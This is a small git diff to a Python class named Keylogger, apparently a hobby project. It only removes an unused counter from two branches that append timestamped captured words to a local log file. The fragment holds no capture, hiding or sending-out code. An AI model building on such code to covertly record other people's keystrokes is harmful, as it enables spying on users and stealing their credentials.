@@ -20,12 +20,10 @@ class Keylogger:
                 # Program will take this route if the var "ll" is an empty string when the shutoff happens
                 g = ""
                 with open("Keylogger/log.txt", "a+") as log:
-                    num = 0
                     date = datetime.datetime.now()
                     dates = date.strftime("%b/%d/%Y")
                     time = date.strftime("%I:%M%p")
                     for i in self.poss_words:
-                        num += 1
                         g += f"{i} "
                     log.write(f"Text Log on {dates} at {time}: {g}\n")
                 print("Logged and exited successfully!")  # Signs out after logging into log.txt
@@ -39,9 +37,7 @@ class Keylogger:
                 dates = date.strftime("%b/%d/%Y")
                 time = date.strftime("%I:%M%p")
                 with open("Keylogger/log.txt", "a+") as log:
-                    num = 0
                     for i in self.poss_words:
-                        num += 1
                         g += f"{i} "
                     log.write(f"Text Log on {dates} at {time}: {g}\n")
                     print("Logged and exited successfully!")  # Signs out after logging into log.txt
